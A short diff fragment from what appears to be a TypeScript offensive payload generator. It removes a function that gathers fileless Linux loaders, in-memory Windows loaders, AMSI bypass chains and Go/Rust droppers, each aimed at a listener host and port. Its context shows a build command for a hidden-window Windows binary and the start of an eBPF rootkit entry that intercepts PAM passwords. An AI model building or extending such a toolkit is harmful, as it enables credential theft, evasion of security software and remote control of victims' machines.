@@ -271,15 +271,6 @@ go build -ldflags="-s -w -H windowsgui" -trimpath -o C:\\Users\\Public\\nx.exe C
   ];
 }
 
-export function buildAllShadowPayloads(lhost: string, lport: string): ShadowPayload[] {
-  return [
-    ...buildLinuxFilelessLoaders(lhost, lport),
-    ...buildWindowsInMemoryLoaders(lhost, lport),
-    ...buildAmsiBypassChains(lhost, lport),
-    ...buildGoRustDroppers(lhost, lport),
-  ];
-}
-
 export function buildEbpfBackdoor(lhost: string, lport: string): ShadowPayload[] {
   return [
     { id:"ebpf_uprobe_pam", name:"eBPF uprobe PAM password interceptor", category:"eBPF-Rootkit",
